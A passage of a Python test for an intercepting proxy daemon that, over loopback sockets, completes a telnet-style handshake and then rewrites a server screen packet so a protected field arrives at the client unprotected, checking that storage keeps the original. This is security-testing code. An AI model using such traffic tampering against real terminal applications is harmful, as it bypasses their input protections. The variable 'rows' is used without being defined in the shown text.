    server_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_listener.bind(("127.0.0.1", 0))
    server_listener.listen(1)
    server_port = server_listener.getsockname()[1]

    daemon = ProxyDaemon(
        protocol=proto, storage=storage,
        listen_addr=("127.0.0.1", free_port),
        target_addr=("127.0.0.1", server_port),
    )

    holder = {}
    def client_thread():
        time.sleep(0.1)
        c = socket.socket()
        c.connect(("127.0.0.1", free_port))
        holder["sock"] = c
    t = threading.Thread(target=client_thread)
    t.start()
    daemon.wait_for_client()
    t.join()

    daemon.connect_to_server()
    server_conn, _ = server_listener.accept()

    try:
        # Complete handshake — send IAC DO NEW-ENVIRON so detect() fires
        server_conn.send(bytes([0xFF, 0xFD, 0x27]))
        _pump(daemon)
        holder["sock"].setblocking(False)
        try:
            holder["sock"].recv(1024)  # drain handshake
        except BlockingIOError:
            pass

        assert daemon.handshake_complete is True

        # Arm unprotect, send the protected-field packet
        daemon.mutate_opts.unprotect = True
        server_conn.send(pkt_protected_field)
        _pump(daemon)

        received = holder["sock"].recv(4096)

        # Re-parse what the client received — field should be unprotected
        s = proto.parse(received)
        assert len(s.fields) == 1
        assert s.fields[0].protected is False

        # Storage should have the ORIGINAL (still protected)

        s2c_data = [r[5] for r in rows if r[2] == "S" and len(r[5]) > 10]
        assert pkt_protected_field in s2c_data

    finally:
        daemon.close()
        holder["sock"].close()
        server_conn.close()
        server_listener.close()
        storage.close()
```
